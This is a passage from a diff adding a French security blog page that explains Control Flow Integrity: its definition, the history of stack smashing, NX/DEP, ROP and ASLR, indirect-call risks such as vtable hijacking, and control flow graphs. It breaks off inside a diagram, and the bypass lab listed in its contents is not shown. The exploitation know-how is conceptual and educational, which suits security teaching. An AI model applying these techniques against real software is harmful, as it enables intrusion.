@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Control Flow Integrity (CFI) : Théorie, mécanismes de défense, implémentations réelles et techniques d'exploitation avancées (DOP) par BUG|PWN. | Control Flow Integrity (CFI): Theory, defense mechanisms, real-world implementations, and advanced exploitation techniques (DOP) by BUG|PWN.">
+    <meta name="keywords" content="Control Flow Integrity, CFI, DOP, Data-Oriented Programming, exploit dev, shadow stack, LLVM CFI, cybersécurité, hacking, bypass">
+    <meta property="og:title" content="Control Flow Integrity | BUG|PWN">
+    <meta property="og:description" content="Control Flow Integrity (CFI) : Théorie, mécanismes de défense, implémentations réelles et techniques d'exploitation avancées (DOP) par BUG|PWN. | Control Flow Integrity (CFI): Theory, defense mechanisms, real-world implementations, and advanced exploitation techniques (DOP) by BUG|PWN.">
+    <meta property="og:image" content="../bugpwn@1x.png">
+    <meta property="og:type" content="article">
+    <title>Control Flow Integrity | BUG|PWN</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&family=JetBrains+Mono:wght@500;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #000000; scroll-behavior: smooth; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        .btn-black { background-color: #000; color: #fff; transition: all 0.2s ease; }
+        .btn-black:hover { background-color: #333; transform: translateY(-1px); }
+
+        .article-body h2 { font-size: 1.5rem; font-weight: 900; text-transform: uppercase; letter-spacing: -0.05em; margin-top: 5rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 2px solid #000; }
+        .article-body h3 { font-size: 1.125rem; font-weight: 700; text-transform: uppercase; letter-spacing: -0.02em; margin-top: 3rem; margin-bottom: 1.5rem; }
+        .article-body p { color: #4b5563; font-weight: 300; line-height: 1.8; margin-bottom: 1.5rem; font-size: 1.125rem; }
+        .article-body strong { color: #000; font-weight: 700; }
+        .article-body ul { margin-bottom: 2rem; color: #4b5563; font-weight: 300; font-size: 1.125rem; }
+        .article-body li { margin-bottom: 0.75rem; padding-left: 1.5rem; position: relative; }
+        .article-body li::before { content: '>'; position: absolute; left: 0; font-family: 'JetBrains Mono'; font-weight: 800; font-size: 0.8rem; color: #000; top: 0.2rem; }
+        .article-body code { font-family: 'JetBrains Mono', monospace; background-color: #f3f4f6; color: #000; padding: 0.1rem 0.4rem; font-size: 0.85em; font-weight: 600; border: 1px solid #e5e7eb; }
+
+        /* colored callout boxes */
+        .box { border-radius: 4px; padding: 1.25rem 1.5rem; margin: 2rem 0; border-left: 4px solid; }
+        .box-title { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.12em; margin-bottom: 0.5rem; }
+        .box p { font-size: 0.95rem !important; margin-bottom: 0 !important; }
+        .box.info  { background: #eff6ff; border-color: #3b82f6; }
+        .box.info  .box-title { color: #1d4ed8; }
+        .box.warn  { background: #fffbeb; border-color: #f59e0b; }
+        .box.warn  .box-title { color: #b45309; }
+        .box.danger{ background: #fef2f2; border-color: #ef4444; }
+        .box.danger .box-title { color: #b91c1c; }
+        .box.ok    { background: #f0fdf4; border-color: #22c55e; }
+        .box.ok    .box-title { color: #15803d; }
+
+        /* tables */
+        .tbl { width: 100%; border-collapse: collapse; font-size: 0.9rem; margin: 2rem 0; }
+        .tbl th { text-align: left; padding: 0.6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.08em; color: #6b7280; border-bottom: 2px solid #000; font-weight: 700; }
+        .tbl td { padding: 0.6rem 1rem; border-bottom: 1px solid #e5e7eb; color: #374151; line-height: 1.5; }
+        .tbl tr:last-child td { border-bottom: none; }
+        .bdg { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; font-weight: 800; padding: 2px 8px; border-radius: 3px; display: inline-block; }
+        .bdg.r { background: #fef2f2; color: #b91c1c; }
+        .bdg.g { background: #f0fdf4; color: #15803d; }
+        .bdg.b { background: #eff6ff; color: #1d4ed8; }
+        .bdg.a { background: #fffbeb; color: #b45309; }
+
+        /* steps */
+        .steps { margin: 2rem 0; }
+        .step { display: flex; gap: 1rem; margin-bottom: 1rem; align-items: flex-start; }
+        .sn { width: 28px; height: 28px; min-width: 28px; border-radius: 50%; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; font-weight: 800; margin-top: 2px; }
+        .sb-title { font-weight: 700; font-size: 0.95rem; color: #000; margin-bottom: 0.2rem; }
+        .sb-desc { font-size: 0.875rem; color: #4b5563; line-height: 1.65; font-weight: 300; }
+        .sb-desc code { font-family: 'JetBrains Mono', monospace; background-color: #f3f4f6; color: #000; padding: 0.1rem 0.4rem; font-size: 0.8em; font-weight: 600; border: 1px solid #e5e7eb; border-radius: 2px; }
+
+        /* stack layout diagram */
+        .stack-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin: 2rem 0; }
+        .stack-col-label { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.1em; color: #6b7280; margin-bottom: 0.5rem; }
+        .sr { display: flex; align-items: center; border: 1px solid #e5e7eb; border-radius: 3px; padding: 0.35rem 0.65rem; margin-bottom: 3px; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; background: #fff; }
+        .sr.norm { color: #374151; }
+        .sr.cb2  { background: #eff6ff; border-color: #93c5fd; color: #1d4ed8; }
+        .sr.ow   { background: #fef2f2; border-color: #f87171; color: #b91c1c; font-weight: 700; }
+        .sr.pad  { background: #fffbeb; border-color: #fcd34d; color: #b45309; }
+        .sr-addr { color: #9ca3af; font-size: 0.65rem; min-width: 60px; margin-right: 0.5rem; }
+
+        /* lab banner */
+        .lab-banner { background: #fef2f2; border: 1px solid #fecaca; border-radius: 4px; padding: 1.4rem 1.6rem; margin-bottom: 2rem; display: flex; align-items: flex-start; gap: 1rem; }
+        .lab-icon { font-size: 1.4rem; color: #b91c1c; margin-top: 2px; }
+        .lab-title { font-weight: 900; font-size: 1rem; color: #b91c1c; margin-bottom: 0.3rem; text-transform: uppercase; letter-spacing: -0.02em; }
+        .lab-sub { font-size: 0.9rem; color: #4b5563; line-height: 1.6; font-weight: 300; }
+
+        /* code block highlight line */
+        .hl { background: rgba(239,68,68,0.12); display: block; margin: 0 -1.5rem; padding: 0 1.5rem; border-left: 3px solid #ef4444; }
+
+        .no-scrollbar::-webkit-scrollbar { height: 6px; }
+        .no-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .no-scrollbar::-webkit-scrollbar-thumb { background: #333; }
+    </style>
+</head>
+<body class="antialiased">
+
+    <!-- NAV -->
+    <nav class="w-full py-6 px-6 md:px-12 bg-white/80 backdrop-blur-md sticky top-0 z-50 border-b border-gray-100">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <a href="../index.html" class="text-xl font-extrabold tracking-tighter flex items-center gap-1">
+                <span class="bg-black text-white px-1.5 py-0.5 rounded-sm">BUG</span>
+                <span>|PWN</span>
+            </a>
+            <div class="hidden md:flex gap-10 text-[13px] font-medium uppercase tracking-[0.15em] text-gray-500">
+                <a href="../index.html#services" class="hover:text-black transition-colors" data-i18n="nav_services">Services</a>
+                <a href="#" class="hover:text-black transition-colors" data-i18n="nav_research">Recherche</a>
+                <a href="../blog.html" class="text-black font-bold transition-colors" data-i18n="nav_blog">Blog</a>
+                <a href="../events.html" class="hover:text-black transition-colors" data-i18n="nav_events">Events</a>
+            </div>
+            <div class="hidden md:flex items-center gap-4">
+                <button id="lang-toggle" class="text-[13px] font-bold uppercase tracking-wider text-gray-500 hover:text-black transition-colors">EN</button>
+                <a href="../contact.html" class="btn-black px-6 py-2.5 rounded text-[13px] font-bold uppercase tracking-wider" data-i18n="nav_contact">Nous contacter</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- HEADER -->
+    <header class="max-w-7xl mx-auto px-6 py-24 md:py-32">
+        <div class="max-w-4xl mx-auto">
+            <a href="../blog.html" class="inline-flex items-center gap-4 text-[10px] font-black uppercase tracking-[0.4em] text-gray-400 hover:text-black transition-colors mb-12 group" data-i18n="art_back">
+                <i class="fas fa-arrow-left group-hover:-translate-x-2 transition-transform"></i> Retour_Archives
+            </a>
+            <div class="flex flex-wrap gap-4 mb-8">
+                <span class="border border-black px-3 py-1 text-[9px] font-black uppercase tracking-widest mono bg-gray-50 text-black">Exploit Dev</span>
+                <span class="border border-black px-3 py-1 text-[9px] font-black uppercase tracking-widest mono bg-black text-white">PWN</span>
+                <span class="border border-gray-200 px-3 py-1 text-[9px] font-black uppercase tracking-widest mono text-gray-500">27.MAY.2026</span>
+            </div>
+            <h1 class="text-5xl md:text-7xl font-black uppercase tracking-tighter leading-[1.05] mb-8" data-i18n="art_title">
+                Control Flow<br>
+                <span class="text-gray-300">Integrity :</span><br>
+                Théorie, Mécanismes<br>et Exploitation.
+            </h1>
+            <p class="text-xl text-gray-500 max-w-2xl leading-relaxed font-light border-l-2 border-black pl-8 mb-4" data-i18n="art_subtitle">
+                Comprendre le CFI de ses origines à ses limites. Une plongée complète dans la théorie, les mécanismes de défense, les implémentations réelles et les techniques d'exploitation avancées incluant le Data-Oriented Programming.
+            </p>
+            <div class="flex flex-wrap gap-4 text-sm text-gray-500 font-light mb-16">
+                <span data-i18n="art_level">Niveau : intermédiaire / avancé</span>
+                <span>·</span>
+                <span data-i18n="art_read_time">Lecture ≈ 30 min</span>
+                <span>·</span>
+                <span data-i18n="art_lab">1 laboratoire pratique</span>
+            </div>
+            <div class="flex items-center gap-6 border-t border-gray-200 pt-8">
+                <div class="w-16 h-16 bg-black text-white flex items-center justify-center font-black text-2xl">R</div>
+                <div>
+                    <div class="text-sm font-black uppercase tracking-widest">Sadoc ADONON</div>
+                    <div class="text-[10px] text-gray-500 uppercase tracking-[0.2em] mono mt-1" data-i18n="art_author_role">Lead Vulnerability Researcher</div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- TABLE DES MATIÈRES -->
+    <section class="max-w-4xl mx-auto px-6 py-16">
+        <div class="bg-gray-50 border border-gray-200 rounded-lg p-8">
+            <h2 style="font-size:1.125rem;font-weight:700;text-transform:uppercase;letter-spacing:-0.02em;margin-bottom:1.5rem;border:none;padding:0;margin-top:0;" data-i18n="toc_title">Table des matières</h2>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:2rem;font-size:0.95rem;">
+                <div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_1"><strong>01.</strong> Qu'est-ce que le Control Flow Integrity ?</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_2"><strong>02.</strong> Contexte historique : la course aux armements</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_3"><strong>03.</strong> Les flots de contrôle en C et C++</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_4"><strong>04.</strong> Le graphe de flot de contrôle (CFG)</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_5"><strong>05.</strong> CFI grossier vs CFI fin : la granularité</div>
+                </div>
+                <div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_6"><strong>06.</strong> Implémentations réelles du CFI</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_7"><strong>07.</strong> Limites du CFI et vecteurs d'attaque</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_8"><strong>08.</strong> Data-Oriented Programming (DOP)</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_9"><strong>09.</strong> Contre-mesures et CFI robuste</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_10"><strong>10.</strong> Laboratoire : vuln, un CFI fin réel à contourner</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ARTICLE -->
+    <main class="max-w-3xl mx-auto px-6 pb-32 article-body">
+
+        <!-- 01 -->
+        <h2 data-i18n="s1_h2">01 - Qu'est-ce que le Control Flow Integrity ?</h2>
+
+        <p data-i18n="s1_p1">
+            Le <strong>Control Flow Integrity</strong>, ou CFI, est une propriété de sécurité formelle qui stipule qu'un programme en cours d'exécution ne peut emprunter que les chemins de code qui ont été <em>explicitement prévus</em> par son auteur. Autrement dit, chaque branchement indirect, qu'il s'agisse d'un retour de fonction, d'un appel via un pointeur, ou d'un saut calculé, doit toujours aboutir à une destination appartenant à un ensemble de cibles légitimes déterminé à l'avance.
+        </p>
+        <p data-i18n="s1_p2">
+            La notion a été formalisée en 2005 par Martin Abadi, Mihai Budiu, Ulfar Erlingsson et Jay Ligatti dans un papier fondateur intitulé <em>"Control-Flow Integrity: Principles, Implémentations, and Applications"</em>. Leur constat de départ est simple mais crucial : les mécanismes de protection mémoire de l'époque (ASLR, DEP/NX) réduisaient la surface d'attaque mais ne l'éliminaient pas, car un attaquant disposant d'une primitive de lecture mémoire pouvait toujours rediriger l'exécution vers du code existant.
+        </p>
+
+        <div class="box info">
+            <div class="box-title" data-i18n="s1_b_t">Définition formelle</div>
+            <p data-i18n="s1_b_p">Le CFI impose que, pour tout transfert de contrôle indirect <em>t</em> dans un programme P, la destination effective soit toujours un élément de l'ensemble <em>Targets(t)</em> prédicalement défini par l'analyse statique du programme. Si ce n'est pas le cas, le comportement est indéfini et une politique de sécurité (terminaison, log, alerte) est appliquée.</p>
+        </div>
+
+        <p data-i18n="s1_p3">
+            En pratique, le CFI agit comme un <strong>garde-fou de dernière ligne</strong>. Il ne supprime pas les vulnérabilités mémoire : les buffer overflows et use-after-free restent des bugs. En revanche, il rend leur exploitation beaucoup plus difficile en empêchant un attaquant de rediriger le flot d'exécution vers une cible arbitraire une fois qu'il a corrompu de la mémoire.
+        </p>
+
+        <!-- 02 -->
+        <h2 data-i18n="s2_h2">02 - Contexte historique : la course aux armements</h2>
+
+        <p data-i18n="s2_p1">
+            Pour bien comprendre pourquoi le CFI est apparu, il faut retracer l'évolution des techniques d'exploitation et des contre-mesures qui les ont précédées. Chaque protection a engendré de nouvelles techniques d'attaque, dans une dynamique de course aux armements permanente.
+        </p>
+
+        <h3 data-i18n="s2_h3_1">Les années 1990 : l'exploitation naive</h3>
+        <p data-i18n="s2_p2">
+            Les premières attaques par buffer overflow (popularisées par l'article d'Aleph One, <em>"Smashing the Stack for Fun and Profit"</em>, 1996) reposaient sur une technique directe : écraser l'adresse de retour sur la pile pour pointer vers du <em>shellcode</em> injecté dans le buffer lui-même. Le processeur exécutait alors ce code arbitraire avec tous les privilèges du processus vulnérable.
+        </p>
+
+        <h3 data-i18n="s2_h3_2">NX/DEP : l'interdiction d'execution</h3>
+        <p data-i18n="s2_p3">
+            La réponse des systèmes d'exploitation et des processeurs a été d'introduire le bit <strong>NX</strong> (<em>No-eXecute</em>) au niveau matériel, et son équivalent logiciel <strong>DEP</strong> (<em>Data Execution Prevention</em>) sous Windows. Le principe : une page mémoire ne peut pas être à la fois writable et exécutable. Le shellcode injecté dans un buffer de données ne peut plus être exécuté.
+        </p>
+
+        <h3 data-i18n="s2_h3_3">Le Return-Oriented Programming : contourner NX</h3>
+        <p data-i18n="s2_p4">
+            En 2007, Hovav Shacham publie le travail fondateur sur le <strong>Return-Oriented Programming (ROP)</strong>. L'idée : puisque NX empêche d'exécuter du code injecté, on va réutiliser des fragments de code <em>déjà présents</em> dans le binaire ou les bibliothèques. Ces fragments, appelés <strong>gadgets</strong>, sont de courtes séquences d'instructions qui se terminent toutes par une instruction <code>ret</code>. En construisant une chaîne d'adresses de gadgets sur la pile, l'attaquant peut exécuter des opérations arbitraires, tout en restant dans des zones mémoire marquées exécutables.
+        </p>
+
+        <div class="box warn">
+            <div class="box-title" data-i18n="s2_b_t">Pourquoi ROP est si puissant</div>
+            <p data-i18n="s2_b_p">Un binaire typique, avec ses bibliothèques linkées (<code>libc</code>, etc.), contient des milliers de gadgets. Des outils comme <code>ROPgadget</code>, <code>ropper</code> ou <code>pwntools</code> permettent de les trouver automatiquement. Il est souvent possible de construire une chaîne Turing-complète à partir des seuls gadgets disponibles dans un binaire.</p>
+        </div>
+
+        <h3 data-i18n="s2_h3_4">ASLR : brouiller les adresses</h3>
+        <p data-i18n="s2_p5">
+            L'<strong>Address Space Layout Randomization</strong> (ASLR), activée dans le noyau Linux depuis 2005 et Windows Vista depuis 2007, randomise les adresses de base des segments (pile, tas, bibliothèques). Sans connaître les adresses exactes des gadgets, construire une chaîne ROP devient difficile, mais pas impossible si une fuite mémoire (<em>information leak</em>) est disponible.
+        </p>
+
+        <h3 data-i18n="s2_h3_5">Le CFI comme réponse systemique</h3>
+        <p data-i18n="s2_p6">
+            C'est dans ce contexte que le CFI prend tout son sens. L'idée est de sortir de la logique réactive (boucher un trou, trouver un contournement, reboucher) pour adopter une propriété de sécurité <em>structurelle</em> : même si un attaquant connaît toutes les adresses du programme et peut corrompre de la mémoire, il ne peut pas rediriger les sauts indirects vers des cibles qu'il choisit librement.
+        </p>
+
+        <!-- 03 -->
+        <h2 data-i18n="s3_h2">03 - Les flots de contrôle en C et C++</h2>
+
+        <p data-i18n="s3_p1">
+            Avant de comprendre comment le CFI les protège, il faut distinguer les différents types de transferts de contrôle qu'un programme peut effectuer, et identifier lesquels sont dangereux.
+        </p>
+
+        <h3 data-i18n="s3_h3_1">Transferts directs vs transferts indirects</h3>
+        <p data-i18n="s3_p2">
+            Un transfert est dit <strong>direct</strong> lorsque sa destination est encodée en dur dans l'instruction elle-même au moment de la compilation. L'instruction <code>call foo</code> en assembleur x86 encode directement le déplacement vers la fonction <code>foo</code>. Peu importe ce que fait l'attaquant aux données, cette instruction ira toujours vers <code>foo</code>.
+        </p>
+        <p data-i18n="s3_p3">
+            Un transfert est dit <strong>indirect</strong> lorsque sa destination est calculée à l'exécution, à partir d'une valeur en registre ou en mémoire. C'est le cas des pointeurs de fonctions en C, des vtables en C++, et de l'instruction <code>ret</code> (qui saute vers l'adresse dépilée de la stack). Ces destinations peuvent être corrompues par un attaquant qui dispose d'une écriture mémoire arbitraire.
+        </p>
+
+        <table class="tbl">
+            <thead>
+                <tr><th data-i18n="s3_th1">Mécanisme</th><th data-i18n="s3_th2">Exemple C/C++</th><th data-i18n="s3_th3">Instruction ASM</th><th data-i18n="s3_th4">Risque</th></tr>
+            </thead>
+            <tbody>
+                <tr><td data-i18n="s3_td1_1">Appel direct</td><td><code>foo(args)</code></td><td><code>call 0x401000</code></td><td><span class="bdg g" data-i18n="s3_td1_4">Faible</span></td></tr>
+                <tr><td data-i18n="s3_td2_1">Retour de fonction</td><td><code>return val</code></td><td><code>ret</code></td><td><span class="bdg r" data-i18n="s3_td2_4">Élevé</span></td></tr>
+                <tr><td data-i18n="s3_td3_1">Pointeur de fonction</td><td><code>(*fp)(args)</code></td><td><code>call rax</code></td><td><span class="bdg r" data-i18n="s3_td3_4">Élevé</span></td></tr>
+                <tr><td data-i18n="s3_td4_1">Vtable C++</td><td><code>obj-&gt;method()</code></td><td><code>call [rax+0x18]</code></td><td><span class="bdg r" data-i18n="s3_td4_4">Élevé</span></td></tr>
+                <tr><td data-i18n="s3_td5_1">Saut indirect</td><td><code>goto *ptr</code></td><td><code>jmp rax</code></td><td><span class="bdg a" data-i18n="s3_td5_4">Moyen</span></td></tr>
+            </tbody>
+        </table>
+
+        <p data-i18n="s3_p4">
+            Le cas du <code>ret</code> mérite une attention particulière : l'adresse de retour est stockée sur la pile par l'instruction <code>call</code>, dans une zone mémoire souvent adjacente aux buffers locaux. Un stack overflow classique peut la corrompre directement : c'est la vulnérabilité originelle de 1996, toujours pertinente aujourd'hui.
+        </p>
+        <p data-i18n="s3_p5">
+            Les <strong>vtables C++</strong> sont un autre vecteur majeur : quand un objet est créé, un pointeur vers sa vtable (table de pointeurs vers les méthodes virtuelles) est stocké dans l'objet lui-même. Si un attaquant peut écrire dans la mémoire de l'objet via un heap overflow ou un use-after-free, il peut remplacer ce pointeur par l'adresse d'une fausse vtable pointant vers du code arbitraire.
+        </p>
+
+        <!-- 04 -->
+        <h2 data-i18n="s4_h2">04 - Le graphe de flot de contrôle (CFG)</h2>
+
+        <p data-i18n="s4_p1">
+            Le concept central du CFI est le <strong>Control Flow Graph</strong>, ou CFG. Il s'agit d'une représentation abstraite de tous les chemins d'exécution possibles d'un programme, construite par analyse statique au moment de la compilation.
+        </p>
+        <p data-i18n="s4_p2">
+            Dans un CFG, chaque nœud représente un bloc de base (une séquence d'instructions sans branchement interne), et chaque arête représente un transfert de contrôle possible. Pour chaque point de branchement indirect dans le programme, chaque <code>call rax</code>, chaque <code>ret</code>, chaque déréférencement de vtable, le CFG définit un ensemble de cibles légitimes.
+        </p>
+
+        <h3 data-i18n="s4_h3_1">Exemple conceptuel</h3>
+        <p data-i18n="s4_p3">
+            Imaginons un programme qui dispose de deux callbacks possibles, <code>handler_a</code> et <code>handler_b</code>, appelés via un pointeur de fonction. Le CFG dira que ce site d'appel a exactement deux cibles valides : <code>handler_a</code> et <code>handler_b</code>. Si à l'exécution, le pointeur de fonction pointe vers <code>system</code> ou vers un gadget ROP, la vérification CFI échoue et le programme est arrêté.
+        </p>
+
+        <div class="box info">
+            <div class="box-title" data-i18n="s4_b_t">Precision du CFG</div>
+            <p data-i18n="s4_b_p">La qualité d'un CFI dépend directement de la précision de son CFG. Un CFG trop permissif (qui met toutes les fonctions dans le même ensemble de cibles) offre peu de protection. Un CFG très précis (qui distingue les cibles site par site, selon les types de signatures) est beaucoup plus résistant mais plus complexe à construire.</p>
+        </div>
+
+        <h3 data-i18n="s4_h3_2">Visualisation du CFG</h3>
+        <div style="margin:2rem 0;">
+            <svg width="100%" viewBox="0 0 700 900" role="img" style="" xmlns="http://www.w3.org/2000/svg">
+  <title style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">Control Flow Graph (CFG)</title>
+  <desc style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">Graphe de flot de contrôle avec blocs de base, branchements conditionnels, appels indirects et validation CFI.</desc>
+  <defs>
+    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </marker>
+    <marker id="arrow-red" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M2 1L8 5L2 9" fill="none" stroke="#E24B4A" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </marker>
+    <marker id="arrow-green" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M2 1L8 5L2 9" fill="none" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </marker>
+  <mask id="imagine-text-gaps-slubbw" maskUnits="userSpaceOnUse"><rect x="0" y="0" width="700" height="900" fill="white"/><rect x="248.9166717529297" y="16" width="182.1666717529297" height="22" fill="black" rx="2"/><rect x="298.6000061035156" y="59" width="82.80000305175781" height="22" fill="black" rx="2"/><rect x="314.875" y="125" width="50.25" height="22" fill="black" rx="2"/><rect x="254.16665649414062" y="144.5" width="171.6666717529297" height="19" fill="black" rx="2"/><rect x="299.0833435058594" y="217" width="81.83333587646484" height="22" fill="black" rx="2"/><rect x="424" y="218" width="28.883333206176758" height="19" fill="black" rx="2"/><rect x="223.0833282470703" y="218" width="32.91666603088379" height="19" fill="black" rx="2"/><rect x="482.8666687011719" y="297" width="154.26666259765625" height="22" fill="black" rx="2"/><rect x="481.1583251953125" y="316.5" width="157.68333435058594" height="19" fill="black" rx="2"/><rect x="36.54166793823242" y="297" width="166.9166717529297" height="22" fill="black" rx="2"/><rect x="55.36666488647461" y="316.5" width="129.26667022705078" height="19" fill="black" rx="2"/><rect x="452.8416748046875" y="391" width="214.31666564941406" height="22" fill="black" rx="2"/><rect x="487.25" y="410.5" width="145.5" height="19" fill="black" rx="2"/><rect x="463.5" y="441" width="193" height="19" fill="black" rx="2"/><rect x="419.8666687011719" y="495.5" width="76.26667022705078" height="19" fill="black" rx="2"/><rect x="525.3499755859375" y="495.5" width="75.30000305175781" height="19" fill="black" rx="2"/><rect x="616.3416748046875" y="495.5" width="55.31666564941406" height="19" fill="black" rx="2"/><rect x="256.79998779296875" y="578.5" width="166.39999389648438" height="19" fill="black" rx="2"/><rect x="213.63333129882812" y="608" width="252.73333740234375" height="19" fill="black" rx="2"/><rect x="26.649999618530273" y="667" width="186.6999969482422" height="22" fill="black" rx="2"/><rect x="58.641666412353516" y="686.5" width="122.71666717529297" height="19" fill="black" rx="2"/><rect x="303.70001220703125" y="769" width="72.5999984741211" height="22" fill="black" rx="2"/><rect x="311.6499938964844" y="822" width="56.70000076293945" height="19" fill="black" rx="2"/><rect x="54" y="846.5" width="79.06666564941406" height="19" fill="black" rx="2"/><rect x="54" y="866.5" width="85.25" height="19" fill="black" rx="2"/><rect x="214" y="846.5" width="130.8499984741211" height="19" fill="black" rx="2"/><rect x="214" y="866.5" width="89.3499984741211" height="19" fill="black" rx="2"/><rect x="420" y="845.5" width="108.55000305175781" height="19" fill="black" rx="2"/><rect x="420" y="865.5" width="96.55000305175781" height="19" fill="black" rx="2"/></mask></defs>
+
+  <!-- Titre -->
+  <text x="340" y="32" text-anchor="middle" style="fill:rgb(250, 249, 245);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:auto">Control Flow Graph (CFG)</text>
+
+  <!-- ── ENTRY ── -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="265" y="50" width="150" height="40" rx="8" stroke-width="0.5" style="fill:rgb(68, 68, 65);stroke:rgb(180, 178, 169);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="340" y="70" text-anchor="middle" dominant-baseline="central" style="fill:rgb(211, 209, 199);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">Entry point</text>
+  </g>
+  <line x1="340" y1="90" x2="340" y2="118" marker-end="url(#arrow)" stroke="var(--t)" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:1.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- ── BLOC A ── -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="205" y="118" width="270" height="54" rx="8" stroke-width="0.5" style="fill:rgb(60, 52, 137);stroke:rgb(175, 169, 236);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="340" y="136" text-anchor="middle" dominant-baseline="central" style="fill:rgb(206, 203, 246);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">Bloc A</text>
